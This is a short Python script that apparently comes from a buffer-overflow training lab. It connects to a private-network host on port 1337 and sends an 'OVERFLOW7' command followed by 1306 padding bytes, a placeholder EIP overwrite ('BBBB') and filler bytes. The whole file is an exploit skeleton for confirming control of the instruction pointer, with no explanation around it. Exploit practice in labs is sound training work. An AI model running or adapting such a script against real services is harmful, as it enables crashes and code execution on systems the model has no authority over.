import struct, socket



host, port = '10.10.243.3', 1337

command = b'OVERFLOW7 '
length = 1500
new_eip = b'BBBB'
offset = 1306
payload = b''.join([

command,
b'A'*1306,
new_eip,
b'C' * (length - offset - len(new_eip)),

])



with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
